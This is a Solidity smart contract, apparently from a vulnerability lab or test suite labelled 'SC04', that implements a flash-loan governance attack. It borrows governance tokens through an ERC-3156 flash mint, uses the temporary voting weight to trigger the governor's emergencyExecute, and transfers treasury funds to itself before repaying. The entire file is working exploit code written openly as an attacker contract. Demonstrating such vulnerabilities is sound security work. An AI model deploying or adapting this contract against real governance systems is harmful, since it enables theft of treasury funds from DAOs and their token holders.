// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC3156FlashBorrower } from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import { GovToken } from "shared/GovToken.sol";
import { KestrelGovernor } from "kestrel/KestrelGovernor.sol";

/// @notice SC04 attacker: flash-mints governance tokens and, inside the ERC-3156 callback,
///         uses the temporary balance as emergency-vote weight to drain the governor's
///         treasury, then repays the loan.
contract FlashGovAttacker is IERC3156FlashBorrower {
    /// @dev ERC-3156 success value.
    bytes32 private constant CALLBACK = keccak256("ERC3156FlashBorrower.onFlashLoan");

    /// @notice Governance token (also the flash lender).
    GovToken public immutable token;
    /// @notice Target governor.
    KestrelGovernor public immutable governor;

    /// @param _token Governance token.
    /// @param _governor Target governor.
    constructor(GovToken _token, KestrelGovernor _governor) {
        token = _token;
        governor = _governor;
    }

    /// @notice Launch the attack, flash-borrowing `loanAmount` governance tokens.
    /// @param loanAmount Amount to flash-mint.
    /// @param stealAmount Treasury amount to move to this contract.
    function attack(uint256 loanAmount, uint256 stealAmount) external {
        token.flashLoan(this, address(token), loanAmount, abi.encode(stealAmount));
    }

    /// @inheritdoc IERC3156FlashBorrower
    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        uint256 stealAmount = abi.decode(data, (uint256));
        governor.emergencyExecute(
            address(token), 0, abi.encodeCall(IERC20.transfer, (address(this), stealAmount))
        );
        token.approve(address(token), amount + fee);
        return CALLBACK;
    }
}
